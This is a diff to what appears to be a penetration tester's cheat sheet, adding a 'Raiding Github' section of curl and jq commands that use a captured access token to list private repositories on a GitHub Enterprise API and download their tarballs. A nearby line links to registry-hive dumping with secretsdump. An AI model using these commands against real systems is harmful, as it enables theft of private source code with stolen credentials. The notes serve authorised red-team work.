@@ -57,3 +57,20 @@ sudo umount "$MOUNT_POINT" && sudo qemu-nbd -d /dev/nbd0 && sudo rmmod nbd
 ### Loot
 
 [Pull registry hive & parse with secretsdump](https://drmarmar.com/posts/vmdk/)
+
+## Raiding Github
+
+### Access Tokens
+
+```
+# source: @thesubtlety 
+
+# list repos
+curl -v -k -H "Content-type:application/json" -H "Authorization: Token <token> " https://github.domain.com/api/v3/user/repos | tee repos.txt
+
+# list repo URLs
+cat repos.txt | jq '.[] | select(.private==true)' | jq '.url'
+
+# nab repo
+curl -L -v -k -H "Content-type:application/json" -H "Authorization: Token <token>" https://github.domain.com/api/v3/repos/USER/REPO/tarball/master > repo.tar.gz
+```
